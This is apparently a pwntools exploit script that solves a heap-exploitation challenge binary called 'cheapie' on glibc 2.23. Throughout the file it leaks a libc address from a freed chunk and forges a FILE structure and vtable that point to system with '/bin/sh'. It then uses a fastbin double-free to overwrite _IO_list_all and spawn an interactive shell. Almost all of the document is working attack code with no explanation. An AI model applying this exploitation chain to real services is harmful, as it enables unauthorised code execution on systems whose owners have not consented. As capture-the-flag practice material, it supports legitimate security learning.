from pwn import *

elf = ELF('./cheapie_patched')
libc = ELF('./libc-2.23.so')
ld = ELF('./ld-2.23.so')

context.log_level = 'debug'
if not args.REMOTE:
    io = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
else:
    io = remote("localhost", 4000)

def malloc(size, data):
    io.sendlineafter(b'>>> ', b'1')
    io.sendlineafter(b"Amount in bytes [16-1024]: ", str(size).encode())
    io.recvuntil(f"malloc({size}) = ".encode())
    chunk_addr = int(io.recvline().strip()[2:], 16)
    io.recvline()
    io.send(data)
    return chunk_addr

def free(addr):
    io.sendlineafter(b'>>> ', b'2')
    io.sendlineafter(b'Address to free: ', str(hex(addr)).encode())

def read(addr):
    io.sendlineafter(b'>>> ', b'3')
    io.sendlineafter(b'Address to show (16-byte sneak peak): ', hex(addr).encode())
    data = io.recvline()
    data = data.strip()
    data = data.replace(b" ", b"")
    return bytearray.fromhex(data.decode("utf8"))

def exit():
    io.sendlineafter(b'>>> ', b'4')

chunk0 = malloc(0x100, b"AAAA")
chunk1 = malloc(0x100, b"BBBB")
log.success(f"chunk0_addr: {hex(chunk0)}")
log.success(f"chunk1_addr: {hex(chunk1)}")

free(chunk0)

chunk0_data = read(chunk0)
main_arena_leak = u64(chunk0_data[:8])
log.success(f"main_arena leak: {hex(main_arena_leak)}")
libc.address = main_arena_leak - 88 - (libc.sym.__malloc_hook + 0x10)
log.success(f"libc base: {hex(libc.address)}")

free(chunk1)

dummy_vtable = flat([
    p64(0) * 3,
    p64(libc.sym.system)
])
dummy_vtable_addr = malloc(0x100, dummy_vtable)
log.success(f"dummy_vtable_addr: {hex(dummy_vtable_addr)}")

dummy_file_struct = flat([
    b'/bin/sh\x00',         # 0x00 _flags
    p64(0x61),              # 0x08 _IO_read_ptr 
    p64(0) * 2,             # 0x10 - 0x18
    p64(1),                 # 0x20 _IO_write_base
    p64(2),                 # 0x28 _IO_write_ptr (must be > write_base to trigger flush)
    p64(0) * 18,            # padding to reach 0xc0
    p32(0),                 # 0xc0 _mode (must be <= 0)
    p8(0) * 20,             # padding to reach 0xd8
    p64(dummy_vtable_addr), # 0xd8 vtable
])

dummy_file_struct_addr = malloc(0x100, dummy_file_struct)
log.success(f"dummy_file_addr: {hex(dummy_file_struct_addr)}")

chunk2 = malloc(0x68, b"CCCC")
chunk3 = malloc(0x68, b"DDDD")
free(chunk2)
free(chunk3)
free(chunk2)

malloc(0x68, p64(libc.sym._IO_list_all - 35))
malloc(0x68, b"XXXX")
malloc(0x68, b"XXXX")
malloc(0x68, p8(0) * 19 + p64(dummy_file_struct_addr))
exit()

io.interactive()


